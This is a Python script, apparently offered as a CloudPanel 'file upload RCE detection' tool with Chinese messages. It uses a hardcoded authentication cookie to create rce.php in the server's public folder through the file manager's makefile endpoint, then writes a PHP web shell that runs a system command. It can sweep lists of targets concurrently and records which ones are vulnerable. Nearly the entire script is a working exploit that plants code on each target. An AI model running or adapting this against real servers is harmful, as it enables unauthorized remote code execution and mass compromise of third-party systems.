import requests
import argparse
import concurrent.futures


def checkRce(url,headers):
    datas = """id=/htdocs/app/files/public/rce.php&content=<?php system('uname -a');?>"""
    try:
        res = requests.post(f"{url}/file-manager/backend/text", headers=headers, data=datas, timeout=10,verify=False)
        if res.status_code == 200 and res.text:
            if "php" in res.text:
                print(f"\033[1;32m[+] {url}存在任意文件上传漏洞....")
                with open('result.txt','a') as f:
                    f.write(f"{url}\\rce.php\n")
                    f.close()
    except Exception as e:
        print(f"[*] {url} RCE Check Failed: {str(e)}")
def checkVuln(url):

    headers = {
        'User-Agent': 'Mozilla/5.0 (compatible; MSIE 5.0; Windows NT 5.1; Trident/3.1)',
        'Connection': 'keep-alive',
        'Cookie':'clp-fm=ZGVmNTAyMDA5NjM3ZTZiYTlmNzQ3MDU1YTNhZGVlM2IxODczMTBjYjYwOTFiNDRmNmZjYTFjZjRiNmFhMTEwOTRiMmNiNTA5Zjc2YjY1ZGRkOWIwMGZmNjE2YWUzOTFiOTM5MDg0Y2U5YzBlMmM5ZTJlNGI3ZTM3NzQ1OTk2MjAxNTliOWUxYjE1ZWVlODYxNGVmOWVkZDVjMjFmYWZkYjczZDFhNGZhOGMyMmQyMmViMGM2YTkwYTE4ZDEzOTdkMmI4YWMwZmI0YWYyNTRmMjUzOTJlNzNiMGM4OWJmZTU0ZDA1NTIwYTJmMjI0MmM2NmQyOWJjNzJlZGExODA0NzBkZmU3YTRkYTM=',
        'Content-Type':'application/x-www-form-urlencoded'
    }
    data = """id=/htdocs/app/files/public/&name=rce.php"""

    try:
        requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
        res = requests.post(f"{url}/file-manager/backend/makefile",headers=headers,data=data,timeout=10,verify=False)
        if res.status_code == 200 and res.text:
            if 'php' in res.text:
                checkRce(url,headers)
            else:
                print(f"\033[1;31m[-] 该目标不存在此漏洞!" + "\033[0m")
        else:
            print(f"\033[1;31m[-] 该目标不存在此漏洞!" + "\033[0m")
    except Exception:
        print(f"\033[1;31m[-] 连接 {url} 发生了问题!" + "\033[0m")



def banner():
    print(""" 
 $$$$$$\                      $$\       $$\ $$$$$$$\                      
$$  __$$\                     $$ |      $$ |$$  __$$\                     
$$ /  \__| $$$$$$\  $$\   $$\ $$ | $$$$$$$ |$$ |  $$ | $$$$$$$\  $$$$$$\  
$$ |      $$  __$$\ $$ |  $$ |$$ |$$  __$$ |$$$$$$$  |$$  _____|$$  __$$\ 
$$ |      $$ /  $$ |$$ |  $$ |$$ |$$ /  $$ |$$  __$$< $$ /      $$$$$$$$ |
$$ |  $$\ $$ |  $$ |$$ |  $$ |$$ |$$ |  $$ |$$ |  $$ |$$ |      $$   ____|
\$$$$$$  |\$$$$$$  |\$$$$$$  |$$ |\$$$$$$$ |$$ |  $$ |\$$$$$$$\ \$$$$$$$\ 
 \______/  \______/  \______/ \__| \_______|\__|  \__| \_______| \_______|
                                                                By:BuOuCat                                                                      
""")



if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="这是一个CloudPanel-RCE文件上传检测程序")
    parser.add_argument("-u", "--url", type=str, help="需要检测的URL")
    parser.add_argument("-f", "--file", type=str, help="指定批量检测文件")
    args = parser.parse_args()

    if args.url:
        banner()
        checkVuln(args.url)
    elif args.file:
        banner()
        f = open(args.file, 'r')
        targets = f.read().splitlines()
        # 使用线程池并发执行检查漏洞
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            executor.map(checkVuln, targets)
    else:
        banner()
        print("-u,--url 指定需要检测的URL")
        print("-f,--file 指定需要批量检测的文件")
